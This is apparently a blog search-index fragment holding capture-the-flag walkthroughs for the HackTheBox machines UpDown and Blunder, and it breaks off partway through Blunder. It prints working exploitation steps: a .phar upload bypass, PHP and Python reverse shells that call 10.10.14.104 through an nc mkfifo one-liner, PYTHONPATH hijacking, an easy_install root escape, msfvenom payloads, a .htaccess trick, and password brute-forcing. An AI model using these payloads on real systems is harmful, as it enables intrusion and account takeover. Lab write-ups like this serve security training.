"2023-01-23 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a web enumeration, /dev/.git is discovered, since .git is found, we are able to view the logs and commits of the git repository, providing us w/ the header needed to access dev.siteisup.htb (siteisup.htb found at index page) &amp;amp; the source code of checker.php a page that allows user to upload a file that contains a bunch of URLs, to check whether the URLs are up, afterwards the uploaded file is deleted.The source code reveals that .phar extension is not banned, allowing us to upload a .phar reverse shell to execute code. Also, the file deletion can be delayed by adding a bunch of URLs after the PHP code, providing us sufficient time to execute our reverse shell, obtaining a low-privilege/www-data shell.For the privilege escalation part, we have to privilege escalate to developer then to root. After enumerating the system for files w/ setuid bit, siteisup an executable is found, after viewing its contents w/ strings, it is calling a python script that is importing a module requests. Since we are able to define our own python path (/tmp), we are able to privilege escalate via Python PATH Hijacking. A malicious library containing a reverse shell is created at /tmp/requests.py, after defining our own Python PATH, /tmp/request.py is executed instead of the actual requests.py library. Column Details Box Name UpDown IP 10.10.11.177 Points 30 Difficulty Medium Creator AB2 Release Date 03 Sep 2022 ReconTCP/80 (HTTP) FFUF 301 GET 9l 28w 310c http://10.10.11.177/dev =&amp;gt; http://10.10.11.177/dev/ 200 GET 40l 93w 1131c http://10.10.11.177/index.php 403 GET 9l 28w 277c http://10.10.11.177/server-status /dev - interesting directory found Initial FootholdTCP/80 (HTTP) - Subdomain Enumeration Proceed to http://updown.htb siteisup.htb - Domain name is revealed (Remember to add it to /etc/hosts ! ) Enumerate the subdomain siteisup.htb ┌──(root💀kali)-[~/htb/UpDown/10.10.11.177/www/gitdumper/.git] └─# ffuf -u http://siteisup.htb -H &quot;Host: FUZZ.siteisup.htb&quot; -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fw 186 dev [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 249ms] dev.siteisup.htb found, but is 403 - Forbidden We’ll come back to thisTCP/80 (HTTP) - siteisup.htb Enumeration (Nothing Found) After some testing, I can conclude that This is a valid request POST Parameters site debug site - if anything other than a link is submitted, “Hacking Attempt was Detected!” After further testing, I don’t think the parameter is vulnerable debug - if anything other than 0 is submitted, debug mode is TRUE After further testing, I don’t think the parameter is vulnerable Let’s move onEnumerate Git Repo Earlier, we found /dev/, directory enumerate /dev/FUZZ .hta [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 249ms] .htaccess [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 250ms] .htpasswd [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 2217ms] .git/HEAD [Status: 200, Size: 21, Words: 2, Lines: 2, Duration: 4238ms] .git - Git repository found We are able to view the contents of the git repository w/ GitTools gitdumper - A tool that will download as much content as possible from the .git repository which do not have directory listing enabled. gitextractor - A tool that will extract commits and their contents from a broken repository. Download .git repo w/ gitdumper ┌──(root💀kali)-[~/tools/GitTools/Dumper] └─# ./gitdumper.sh http://updown.htb/dev/.git/ ~/htb/UpDown/10.10.11.177/www/updown.htb/dev/gitdumper ########### # GitDumper is part of https://github.com/internetwache/GitTools # # Developed and maintained by @gehaxelt from @internetwache # # Use at your own risk. Usage might be illegal in certain circumstances. # Only for educational purposes! ########### [*] Destination folder does not exist [+] Creating /root/htb/UpDown/10.10.11.177/www/updown.htb/dev/gitdumper/.git/ [+] Downloaded: HEAD [-] Downloaded: objects/info/packs [+] Downloaded: description [+] Downloaded: config [-] Downloaded: COMMIT_EDITMSG [+] Downloaded: index [+] Downloaded: packed-refs [-] Downloaded: refs/heads/master [+] Downloaded: refs/remotes/origin/HEAD [-] Downloaded: refs/stash [+] Downloaded: logs/HEAD [-] Downloaded: logs/refs/heads/master [+] Downloaded: logs/refs/remotes/origin/HEAD [-] Downloaded: info/refs [+] Downloaded: info/exclude [-] Downloaded: /refs/wip/index/refs/heads/master [-] Downloaded: /refs/wip/wtree/refs/heads/master [-] Downloaded: objects/01/0dcc30cc1e89344e2bdbd3064f61c772d89a34 [-] Downloaded: objects/00/00000000000000000000000000000000000000 Since the .git directory has directory listing enabled, we can do the same w/ wget ┌──(root💀kali)-[~/htb/UpDown/10.10.11.177/www/gitdumper/.git] └─# wget -r http://updown.htb/dev/.git/ View files in the git repository w/ git ls-files ┌──(root💀kali)-[~/htb/UpDown/10.10.11.177/www/gitdumper/.git] └─# git ls-files .htaccess admin.php changelog.txt checker.php index.php stylesheet.css Compile all logs &amp;amp; commits into a file (For Easier Viewing) ┌──(root💀kali)-[~/htb/UpDown/10.10.11.177/www/wget-git/updown.htb/dev] └─# git log main | grep commit | awk &#39;{print $2}&#39; &amp;gt; commits ┌──(root💀kali)-[~/htb/UpDown/10.10.11.177/www/wget-git/updown.htb/dev] └─# cat commits | while read in; do git show &quot;$in&quot; &amp;gt;&amp;gt; logs; done ┌──(root💀kali)-[~/htb/UpDown/10.10.11.177/www/wget-git/updown.htb/dev] └─# ls commits index.html logs Found an interesting commit bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab - New technique in header to protect our dev vhost. Special-Dev: only4dev is a required header to access dev.siteisup.htb Enumerate Git Repo (GitKraken) Install gitkraken wget https://release.gitkraken.com/linux/gitkraken-amd64.tar.gz sudo tar -xvzf gitkraken-amd64.tar.gz gitkraken allows us to view the commits more easily Launch gitkraken &amp;amp; open the repo for analysis Found an interesting commit, bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab - New technique in header to protect our dev vhost. Special-Dev: only4dev is a required header to access dev.siteisup.htb Found another interesting commit f67efd00c10784ae75bd251add3d52af50d7addd - Create checker.php ...SNIP... &amp;lt;?php function isitup($url){ $ch=curl_init(); curl_setopt($ch, CURLOPT_URL, trim($url)); curl_setopt($ch, CURLOPT_USERAGENT, &quot;siteisup.htb beta&quot;); curl_setopt($ch, CURLOPT_HEADER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_TIMEOUT, 30); $f = curl_exec($ch); $header = curl_getinfo($ch); if($f AND $header[&#39;http_code&#39;] == 200){ return array(true,$f); }else{ return false; } curl_close($ch); } if($_POST[&#39;check&#39;]){ # File size must be less than 10kb. if ($_FILES[&#39;file&#39;][&#39;size&#39;] &amp;gt; 10000) { die(&quot;File too large!&quot;); } $file = $_FILES[&#39;file&#39;][&#39;name&#39;]; # Check if extension is allowed. $ext = getExtension($file); if(preg_match(&quot;/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i&quot;,$ext)){ die(&quot;Extension not allowed!&quot;); } # Create directory to upload our file. $dir = &quot;uploads/&quot;.md5(time()).&quot;/&quot;; if(!is_dir($dir)){ mkdir($dir, 0770, true); } # Upload the file. $final_path = $dir.$file; move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &quot;{$final_path}&quot;); # Read the uploaded file. $websites = explode(&quot;\\n&quot;,file_get_contents($final_path)); foreach($websites as $site){ $site=trim($site); if(!preg_match(&quot;#file://#i&quot;,$site) &amp;amp;&amp;amp; !preg_match(&quot;#data://#i&quot;,$site) &amp;amp;&amp;amp; !preg_match(&quot;#ftp://#i&quot;,$site)){ $check=isitup($site); if($check){ echo &quot;&amp;lt;center&amp;gt;{$site}&amp;lt;br&amp;gt;&amp;lt;font color=&#39;green&#39;&amp;gt;is up ^_^&amp;lt;/font&amp;gt;&amp;lt;/center&amp;gt;&quot;; }else{ echo &quot;&amp;lt;center&amp;gt;{$site}&amp;lt;br&amp;gt;&amp;lt;font color=&#39;red&#39;&amp;gt;seems to be down :(&amp;lt;/font&amp;gt;&amp;lt;/center&amp;gt;&quot;; } }else{ echo &quot;&amp;lt;center&amp;gt;&amp;lt;font color=&#39;red&#39;&amp;gt;Hacking attempt was detected !&amp;lt;/font&amp;gt;&amp;lt;/center&amp;gt;&quot;; } } # Delete the uploaded file. @unlink($final_path); } function getExtension($file) { $extension = strrpos($file,&quot;.&quot;); return ($extension===false) ? &quot;&quot; : substr($file,$extension+1); } ?&amp;gt; ...SNIP... Basically what the PHP code is doing is, Checks if the file we uploaded is less than 10 kb, else die Checks if the content of the file we uploaded, whether it has any banned extensions (This is to prevent PHP file from being uploaded). However, .phar is not in the list, this means that we can upload a .phar file to do code execution. Next, a directory (uploads/md5sum/&amp;lt;uploaded file&amp;gt;) is created to store our uploaded file. Next, it curl the URLs in our file. After the for loop goes through all the URLs, delete the uploaded file. How do we do a file upload bypass to execute PHP code Since .phar is not banned, we can execute PHP code We can add a bunch of URLs at the end of our PHP code, this will give us sufficient time to browse to /upload/md5sum/&amp;lt;uploaded file&amp;gt; to execute our PHP code. &amp;lt;PHP CODE&amp;gt; http://example.com http://example.com http://example.com http://example.com more URLs TCP/80 (HTTP) - dev.siteisup.htb, File Upload Bypass + Command Execution Add Special-Dev: only4dev Header w/ hackbar This will permanently add Special-Dev: only4dev Header. Create our payload # Payload http://example.com &amp;lt;?php system($_GET[&#39;c&#39;]); ?&amp;gt; http://example.com http://example.com http://example.com http://example.com http://example.com http://example.com http://example.com http://example.com http://example.com http://example.com more URLs It failed Lets look at phpinfo() to see why # Payload &amp;lt;?php phpinfo(); ?&amp;gt; http://example.com http://example.com http://example.com http://example.com http://example.com http://example.com http://example.com http://example.com http://example.com http://example.com more URLs A bunch of command execution functions are disabled system(), passthru(), shell_exec(), popen(), fsockopen(). Lets find out if we can bypass the restrictions w/ dfunc-bypasser Download phpinfo file ┌──(root💀kali)-[~/htb/UpDown/10.10.11.177/exploit] └─# curl http://dev.siteisup.htb/uploads/dd2f884d6ca7dba024fa145f8b5b258b/exploit.phar -H &quot;Special-Dev: only4dev&quot; -H &quot;Host: dev.siteisup.htb&quot; &amp;gt; phpinfo.php Run dfunc-bypasser ┌──(root💀kali)-[~/htb/UpDown/10.10.11.177/exploit] └─# python dfunc-bypasser.py --file phpinfo.php Please add the following functions in your disable_functions option: proc_open If PHP-FPM is there stream_socket_sendto,stream_socket_client,fsockopen can also be used to be exploit by poisoning the request to the unix socket proc_open - we can use this to invoke a reverse shell ! Create our payload - Source &amp;lt;?php // descriptor array $desc = array( 0 =&amp;gt; array(&#39;pipe&#39;, &#39;r&#39;), // 0 is STDIN for process 1 =&amp;gt; array(&#39;pipe&#39;, &#39;w&#39;), // 1 is STDOUT for process 2 =&amp;gt; array(&#39;file&#39;, &#39;/tmp/error-output.txt&#39;, &#39;a&#39;) // 2 is STDERR for process ); // command to invoke markup engine $cmd = &quot;ping -c 5 10.10.14.104&quot;; // spawn the process $p = proc_open($cmd, $desc, $pipes); // send the wiki content as input to the markup engine // and then close the input pipe so the engine knows // not to expect more input and can start processing fwrite($pipes[0], $content); fclose($pipes[0]); // read the output from the engine $html = stream_get_contents($pipes[1]); // all done! Clean up fclose($pipes[1]); fclose($pipes[2]); proc_close($p); ?&amp;gt; http://example.com http://example.com http://example.com more URLs Demo - File Upload Bypass -&amp;gt; Command Execution Test Ping returned ! Invoke reverse shell # Payload &amp;lt;?php // descriptor array $desc = array( 0 =&amp;gt; array(&#39;pipe&#39;, &#39;r&#39;), // 0 is STDIN for process 1 =&amp;gt; array(&#39;pipe&#39;, &#39;w&#39;), // 1 is STDOUT for process 2 =&amp;gt; array(&#39;file&#39;, &#39;/tmp/error-output.txt&#39;, &#39;a&#39;) // 2 is STDERR for process ); // command to invoke markup engine $cmd = &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.104 4444 &amp;gt;/tmp/f&quot;; // spawn the process $p = proc_open($cmd, $desc, $pipes); // send the wiki content as input to the markup engine // and then close the input pipe so the engine knows // not to expect more input and can start processing fwrite($pipes[0], $content); fclose($pipes[0]); // read the output from the engine $html = stream_get_contents($pipes[1]); // all done! Clean up fclose($pipes[1]); fclose($pipes[2]); proc_close($p); ?&amp;gt; http://example.com http://example.com http://example.com more URLs www-data shell obtained ┌──(root💀kali)-[~/htb/UpDown/10.10.11.177/exploit] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.177. Ncat: Connection from 10.10.11.177:58708. /bin/sh: 0: can&#39;t access tty; job control turned off $ id;whoami uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data $ Demo - File Upload Bypass -&amp;gt; Invoke Reverse Shell Privilege EscalationDeveloper - Enumeration Enumerate the system for files w/ setuid bit www-data@updown:/tmp$ find / -perm /4000 -type f -exec ls -lda {} \\; 2&amp;gt;/dev/null -rwsr-xr-- 1 root messagebus 51344 Apr 29 12:03 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 14488 Jul 8 2019 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 22840 Feb 21 2022 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-xr-x 1 root root 473576 Mar 30 2022 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 53040 Mar 14 2022 /usr/bin/chsh -rwsr-xr-x 1 root root 67816 Feb 7 2022 /usr/bin/su -rwsr-xr-x 1 root root 39144 Feb 7 2022 /usr/bin/umount -rwsr-xr-x 1 root root 166056 Jan 19 2021 /usr/bin/sudo -rwsr-xr-x 1 root root 88464 Mar 14 2022 /usr/bin/gpasswd -rwsr-xr-x 1 root root 39144 Mar 7 2020 /usr/bin/fusermount -rwsr-sr-x 1 daemon daemon 55560 Nov 12 2018 /usr/bin/at -rwsr-xr-x 1 root root 68208 Mar 14 2022 /usr/bin/passwd -rwsr-xr-x 1 root root 44784 Mar 14 2022 /usr/bin/newgrp -rwsr-xr-x 1 root root 85064 Mar 14 2022 /usr/bin/chfn -rwsr-xr-x 1 root root 55528 Feb 7 2022 /usr/bin/mount -rwsr-x--- 1 developer www-data 16928 Jun 22 15:45 /home/developer/dev/siteisup /home/developer/dev/siteisup - user developer setuid bit View contents of /home/developer/dev/siteisup w/ strings ...SNIP... Welcome to &#39;siteisup.htb&#39; application /usr/bin/python /home/developer/dev/siteisup_test.py ...SNIP... /home/developer/dev/siteisup_test.py - python script is called View /home/developer/dev/siteisup_test.py www-data@updown:/tmp$ cat /home/developer/dev/siteisup_test.py import requests url = input(&quot;Enter URL here:&quot;) page = requests.get(url) if page.status_code == 200: print &quot;Website is up&quot; else: print &quot;Website is down&quot; requests - library is imported Developer - Python PATH Hijacking How do we exploit /home/developer/dev/siteisup? siteisup is calling a python script siteisup_test.py siteisup_test.py is importing a library requests We are able to do Python PATH Hijacking by defining our own python path to a writable directory /tmp Next, create a malicious python library in our writable directory /tmp also called requests.py that will invoke a reverse shell. Since we defined that /tmp is our python path, requests.py will be executed, instead of the actual requests.py, invoking our reverse shell. Exploiting /home/developer/dev/siteisup Remove f created earlier from our reverse shell Create malicious python library /tmp/requests.py import os; os.system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.104 4444 &amp;gt;/tmp/f&quot;) Define our python path www-data@updown:/tmp$ export PYTHONPATH=/tmp Start netcat listener ┌──(root💀kali)-[~/htb/UpDown] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Invoke reverse shell /home/developer/dev/siteisup developer shell obtained ┌──(root💀kali)-[~/htb/UpDown] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.177. Ncat: Connection from 10.10.11.177:59048. $ id;whoami uid=1002(developer) gid=33(www-data) groups=33(www-data) developer $ cd /home/developer $ ls dev user.txt Demo - Python PATH Hijacking Privilege Escalation Copy user developer’s SSH private key (/home/developer/.ssh/id_rsa) &amp;amp; SSH to obtain a stable shell ┌──(root💀kali)-[~/htb/UpDown/10.10.11.177/loot] └─# ssh developer@updown.htb -i id_rsa Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-122-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Mon Oct 24 11:43:51 UTC 2022 System load: 0.0 Usage of /: 51.8% of 2.84GB Memory usage: 29% Swap usage: 0% Processes: 256 Users logged in: 0 IPv4 address for eth0: 10.10.11.177 IPv6 address for eth0: dead:beef::250:56ff:feb9:b8c1 8 updates can be applied immediately. 8 of these updates are standard security updates. To see these additional updates run: apt list --upgradable The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Tue Aug 30 11:24:44 2022 from 10.10.14.36 developer@updown:~$ Root - Enumeration View user developer sudo access developer@updown:/tmp$ sudo -l Matching Defaults entries for developer on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User developer may run the following commands on localhost: (ALL) NOPASSWD: /usr/local/bin/easy_install easy_install - has a GTFOBins Entry Root - SUDO GTFOBINS How do we exploit easy_install? We can break out from restricted environments by spawning an interactive system shell. Exploiting easy_install Spawn a root shell developer@updown:/tmp$ TF=$(mktemp -d) developer@updown:/tmp$ echo &quot;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &amp;lt;$(tty) &amp;gt;$(tty) 2&amp;gt;$(tty)&#39;)&quot; &amp;gt; $TF/setup.py developer@updown:/tmp$ sudo /usr/local/bin/easy_install $TF WARNING: The easy_install command is deprecated and will be removed in a future version. Processing tmp.bFSWGPKmBI Writing /tmp/tmp.bFSWGPKmBI/setup.cfg Running setup.py -q bdist_egg --dist-dir /tmp/tmp.bFSWGPKmBI/egg-dist-tmp-ZC4HiO # Demo - easy_install GTFOBins Privilege Escalation AdditionalDeveloper - Escape Python Sandbox Environment Instead of Python PATH Hijacking, we escape the python sandbox environment Execute /home/developer/dev/siteisup &amp;amp; escape the sandbox environment www-data@updown:/tmp$ /home/developer/dev/siteisup Welcome to &#39;siteisup.htb&#39; application Enter URL here:__import__(&#39;os&#39;).system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.32 4444 &amp;gt;/tmp/f&#39;) rm: cannot remove &#39;/tmp/f&#39;: No such file or directory Patch Command Execution (phpinfo) Add proc_open to the list of banned functions # nano /etc/php/8.0/apache2/php.ini # CTRL + W to find disable_functions disable_functions = pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcn tl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo, pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlin k,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen, proc_open Restart apache to apply changes # service apache2 restart View phpinfo Try to execute our reverse shell Patched ! Patch File Upload Bypass Add .phar extension to the list of banned extensions ...SNIP... # Check if extension is allowed. $ext = getExtension($file); if(preg_match(&quot;/php|php[0-9]|phar|html|py|pl|phtml|zip|rar|gz|gzip|tar/i&quot;,$ext)){ die(&quot;Extension not allowed!&quot;); } ...SNIP... Restart apache to apply changes # service apache2 restart Try to upload exploit.phar Patched ! " }, { "title": "HackTheBox - Blunder", "url": "/posts/Blunder/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "cewl, tcp/80-http/web-app-cms-exploit", "date": "2023-01-01 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a web enumeration, discovering bludit CMS running, it is vulnerable to a bruteforce protection bypass, directory traversal + image upload exec vulnerability. With cewl, a password word list is generated, to bruteforce against user fergus (revealed at todo.txt). With a valid set of credential, we are able to upload a malicious png file containing a reverse shell payload and a .htaccess file so that our png is processed as a php file by leveraging the directory traversal ../ vulnerability. Allowing us to obtain a low-privilege/www-data user.For the privilege escalation part, we have to first privilege escalate to user hugo. After enumerating the system, User hugo hash can be at user.php a database file where user’s hashes are stored, after cracking the hash, we can simply switch to user hugo. Next, the system is vulnerable to a sudo security bypass allowing user hugo to execute /bin/bash as root. Column Details Box Name Blunder IP 10.10.10.191 Points 20 Difficulty Easy Creator egotisticalSW Release Date 30 May 2020 ReconTCP/80 (HTTP) FFUF - big.txt 301 GET 0l 0w 0c http://10.10.10.191/admin =&amp;gt; http://10.10.10.191/admin/ 200 GET 4l 23w 118c http://10.10.10.191/todo.txt &amp;gt; 2 interesting directory enumerated {: .prompt-info } TCP/21 (FTP)PORT STATE SERVICE REASON VERSION21/tcp closed ftp reset ttl 63Initial FootholdTCP/80 (HTTP) - Bludit 3.9.2 Bruteforce Prevention Bypass Found CMS w/ burpsuite Bludit, some kind of CMS? Search exploits for bludit Exploit Title Path Bludit 3.9.12 - Directory Traversal php/webapps/48568.py Bludit 3.9.2 - Auth Bruteforce Bypass php/webapps/48942.py Bludit 3.9.2 - Authentication Bruteforce Bypass (Metasploit) php/webapps/49037.rb Bludit 3.9.2 - Directory Traversal multiple/webapps/48701.txt How does Bludit 3.9.2 - Auth Bruteforce Bypass work? Bludit has a bruteforce prevention mechanism, it uses a function getUserIp which attempts to determine the true IP address of the end user by trusting the X-Forwarded-For and Client-IP HTTP headers, however attackers can easily spoof the source IP address, Also, there are no checks/validations to ensure that they are valid IP addresses, Allowing attackers to use any arbitrary value and not risk being locked out After visting http://blunder.htb, I realised that there are a lot of words, usually when this happens, I will use cewl to create a password word list. ┌──(root💀kali)-[~/htb/blunder/10.10.10.191/exploit] └─# cewl http://10.10.10.191/ -w passwords.txt CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/) Next, proceed to http://blunder.htb/todo.txt ┌──(root💀kali)-[~/htb/blunder/10.10.10.191/exploit] └─# curl blunder.htb/todo.txt -Update the CMS -Turn off FTP - DONE -Remove old users - DONE -Inform fergus that the new blog needs images - PENDING fergus seems like a username With that, we can proceed to bruteforce the admin page ┌──(root💀kali)-[~/htb/blunder/10.10.10.191/exploit] └─# python3 48942.py -l http://10.10.10.191/admin/ -u usernames.txt -p passwords.txt [*] Bludit Auth BF Mitigation Bypass Script by ColdFusionX [◥] Brute Force: Testing -&amp;gt; fergus:the [▖] Brute Force: Testing -&amp;gt; fergus:Load [▆] Brute Force: Testing -&amp;gt; fergus:Plugins ... [*] SUCCESS !! [+] Use Credential -&amp;gt; fergus:RolandDeschain Valid Credentials fergus:RolandDeschain After login, we can confirm the version of Bludit Bludit 3.9.2 TCP/80 (HTTP) - Bludit 3.9.2 Directory Traversal + Image Upload Exec (Metasploit) Launch msfconsole Use linux/http/bludit_upload_images_exec Set OPTIONS msf6 exploit(linux/http/bludit_upload_images_exec) &amp;gt; set LHOST tun0 LHOST =&amp;gt; tun0 msf6 exploit(linux/http/bludit_upload_images_exec) &amp;gt; set BLUDITPASS RolandDeschain BLUDITPASS =&amp;gt; RolandDeschain msf6 exploit(linux/http/bludit_upload_images_exec) &amp;gt; set BLUDITUSER fergus BLUDITUSER =&amp;gt; fergus msf6 exploit(linux/http/bludit_upload_images_exec) &amp;gt; set RHOSTS 10.10.10.191 RHOSTS =&amp;gt; 10.10.10.191 msf6 exploit(linux/http/bludit_upload_images_exec) &amp;gt; set TARGETURI / TARGETURI =&amp;gt; / msf6 exploit(linux/http/bludit_upload_images_exec) &amp;gt; show options Module options (exploit/linux/http/bludit_upload_images_exec): Name Current Setting Required Description ---- --------------- -------- ----------- BLUDITPASS RolandDeschain yes The password for Bludit BLUDITUSER fergus yes The username for Bludit Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.191 yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes The base path for Bludit VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST tun0 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Bludit v3.9.2 Exploit ! TCP/80 (HTTP) - Bludit 3.9.2 Directory Traversal + Image Upload Exec (Python Script) How does Bludit 3.9.2 - Directory Traversal - multiple/webapps/48701.txt work? Remote user could abuse the uuid parameter in the image upload feature in order to save a malicious payload anywhere onto the server, and then use a custom .htaccess file to bypass the file extension check to finally get remote code execution. Try Bludit 3.9.2 - Directory Traversal - multiple/webapps/48701.txt Create evil.png payload ┌──(root💀kali)-[~/htb/blunder/10.10.10.191/exploit/dirTraversal] └─# msfvenom -p php/reverse_php LHOST=10.10.14.3 LPORT=53 -f raw -b &#39;&quot;&#39; &amp;gt; evil.png [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload [-] No arch selected, selecting arch: php from the payload Found 2 compatible encoders Attempting to encode payload with 1 iterations of php/base64 php/base64 succeeded with size 4062 (iteration=0) php/base64 chosen with final size 4062 Payload size: 4062 bytes ┌──(root💀kali)-[~/htb/blunder/10.10.10.191/exploit/dirTraversal] └─# echo -e &quot;&amp;lt;?php $(cat evil.png)&quot; &amp;gt; evil.png This is our reverse shell payload Next, we create .htaccess payload ┌──(root💀kali)-[~/htb/blunder/10.10.10.191/exploit/dirTraversal] └─# echo &quot;RewriteEngine off&quot; &amp;gt; .htaccess echo &quot;AddType application/x-httpd-php .png&quot; &amp;gt;&amp;gt; .htaccess This will cause the webserver to treat .png files as php, allowing us to execute our reverse shell. Change some options in the .txt file url = &#39;http://blunder.htb&#39; # CHANGE ME username = &#39;fergus&#39; # CHANGE ME password = &#39;RolandDeschain&#39; # CHANGE ME Change file from .txt to .py and execute it ┌──(root💀kali)-[~/htb/blunder/10.10.10.191/exploit/dirTraversal] └─# python3 directoryTraversal.py cookie: v9vstg851aiqpo58j4a9preao3 csrf_token: d62162e1fc3f36fd0b39d184150900a84595fab6 Uploading payload: evil.png Uploading payload: .htaccess Start listener and execute evil.png ┌──(root💀kali)-[~/htb/blunder] └─# nc -nvlp 53 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::53 Ncat: Listening on 0.0.0.0:53 ┌──(root💀kali)-[~/htb/blunder/10.10.10.191/exploit/dirTraversal] └─# curl http://blunder.htb/bl-content/tmp/temp/evil.png ┌──(root💀kali)-[~/htb/blunder] └─# nc -nvlp 53 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::53 Ncat: Listening on 0.0.0.0:53 Ncat: Connection from 10.10.10.191. Ncat: Connection from 10.10.10.191:47562. Demo - Bludit 3.9.2 Directory Traversal + Image Upload Exec For some reason, I could not spawn a stable shell, to work around it, I created a another webshell from the current shell, invoked a reverse shell and continued from there.Privilege EscalationHugo - Found Creds After obtaining the www-data user, I proceed to the /home directory and found 2 other users www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ ls -la /home total 16 drwxr-xr-x 4 root root 4096 Apr 27 2020 . drwxr-xr-x 21 root root 4096 Jul 6 2021 .. drwxr-xr-x 16 hugo hugo 4096 May 26 2020 hugo drwxr-xr-x 16 shaun shaun 4096 Jul 6 2021 shaun Since bludit is a CMS, there should be a database somewhere, possibly containing more credentials This document shows the directory structure of bludit, there is an interesting file users.php, hashes are stored there. View /var/www/bludit-3.9.2/bl-content/databases/users.php www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ cat users.php &amp;lt;?php defined(&#39;BLUDIT&#39;) or die(&#39;Bludit CMS.&#39;); ?&amp;gt; { &quot;admin&quot;: { &quot;nickname&quot;: &quot;Admin&quot;, &quot;firstName&quot;: &quot;Administrator&quot;, &quot;lastName&quot;: &quot;&quot;, &quot;role&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;bfcc887f62e36ea019e3295aafb8a3885966e265&quot;, &quot;salt&quot;: &quot;5dde2887e7aca&quot;, &quot;email&quot;: &quot;&quot;, &quot;registered&quot;: &quot;2019-11-27 07:40:55&quot;, &quot;tokenRemember&quot;: &quot;&quot;, &quot;tokenAuth&quot;: &quot;b380cb62057e9da47afce66b4615107d&quot;, &quot;tokenAuthTTL&quot;: &quot;2009-03-15 14:00&quot;, &quot;twitter&quot;: &quot;&quot;, &quot;facebook&quot;: &quot;&quot;, &quot;instagram&quot;: &quot;&quot;, &quot;codepen&quot;: &quot;&quot;, &quot;linkedin&quot;: &quot;&quot;, &quot;github&quot;: &quot;&quot;, &quot;gitlab&quot;: &quot;&quot; }, &quot;fergus&quot;: { &quot;firstName&quot;: &quot;&quot;, &quot;lastName&quot;: &quot;&quot;, &quot;nickname&quot;: &quot;&quot;, &quot;description&quot;: &quot;&quot;, &quot;role&quot;: &quot;author&quot;, &quot;password&quot;: &quot;be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7&quot;, &quot;salt&quot;: &quot;jqxpjfnv&quot;, &quot;email&quot;: &quot;&quot;, &quot;registered&quot;: &quot;2019-11-27 13:26:44&quot;, &quot;tokenRemember&quot;: &quot;&quot;, &quot;tokenAuth&quot;: &quot;0e8011811356c0c5bd2211cba8c50471&quot;, &quot;tokenAuthTTL&quot;: &quot;2009-03-15 14:00&quot;, &quot;twitter&quot;: &quot;&quot;, &quot;facebook&quot;: &quot;&quot;, &quot;codepen&quot;: 